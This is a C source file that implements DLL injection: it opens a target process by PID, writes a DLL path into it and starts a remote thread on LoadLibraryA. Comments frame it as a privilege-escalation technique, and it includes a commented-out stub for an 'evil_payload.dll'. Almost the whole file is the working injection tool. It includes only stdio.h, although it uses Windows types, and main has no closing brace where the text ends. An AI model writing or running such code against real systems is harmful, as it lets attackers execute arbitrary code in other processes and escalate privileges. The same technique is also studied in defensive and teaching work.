#include <stdio.h>

// A simplified example of a DLL injection for privilege escalation using CreateRemoteThread and LoadLibrary
// This would typically be combined with a vulnerable service or process to achieve elevation.

// Payload DLL (e.g., evil_payload.dll) content (compiled separately)
/*
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, "Payload Injected!", "Success", MB_OK);
        // In a real scenario, this would perform malicious actions
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
*/

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <PathToEvilDLL>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hProcess == NULL) {
        printf("Error: Could not open process %lu. GetLastError: %lu\n", pid, GetLastError());
        return 1;
    }

    // Allocate memory in the remote process for the DLL path
    LPVOID remotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remotePath == NULL) {
        printf("Error: Could not allocate memory in remote process. GetLastError: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, remotePath, dllPath, strlen(dllPath) + 1, NULL)) {
        printf("Error: Could not write to process memory. GetLastError: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Get the address of LoadLibraryA in kernel32.dll
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("Error: Could not get handle to kernel32.dll. GetLastError: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        printf("Error: Could not get address of LoadLibraryA. GetLastError: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to call LoadLibraryA with the DLL path
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remotePath, 0, NULL);
    if (hRemoteThread == NULL) {
        printf("Error: Could not create remote thread. GetLastError: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hRemoteThread, INFINITE);

    printf("DLL injected successfully into PID %lu!\n", pid);

    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
